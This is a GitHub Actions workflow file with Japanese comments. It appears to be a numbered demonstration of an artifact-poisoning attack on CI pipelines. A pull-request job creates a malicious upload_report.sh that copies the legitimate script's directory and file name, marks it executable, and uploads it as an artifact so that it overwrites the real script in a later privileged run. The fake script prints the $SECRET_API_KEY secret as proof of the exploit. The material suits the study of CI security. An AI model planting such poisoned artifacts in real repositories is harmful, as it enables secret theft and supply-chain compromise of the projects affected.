name: 07 - PR Build (Untrusted)
on:
  pull_request:
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Create Malicious Artifact
        run: |
          # 😈 攻撃のキモ：正規のリポジトリと同じディレクトリ構造（scripts/）をわざと作ります
          mkdir -p report/scripts
          
          # 😈 悪意のあるスクリプトを作成し、正規のファイル名（upload_report.sh）と同じ名前で保存します
          cat << 'EOF' > report/scripts/upload_report.sh
          #!/bin/bash
          echo "🚨🚨🚨 ANT-DESIGN EXPLOIT SUCCESS: FILE OVERWRITTEN! 🚨🚨🚨"
          echo "😈 私は正規のスクリプトに成り代わったマルウェアです！"
          echo "💰 奪取したシークレットキー: $SECRET_API_KEY"
          EOF
          
          # 実行権限を付与しておく
          chmod +x report/scripts/upload_report.sh

      - name: Upload Poisoned Artifact
        uses: actions/upload-artifact@v4
        with:
          name: pr-report
          path: report/ # 👈 悪意のある scripts/ フォルダを含んだ状態でアップロードさせます
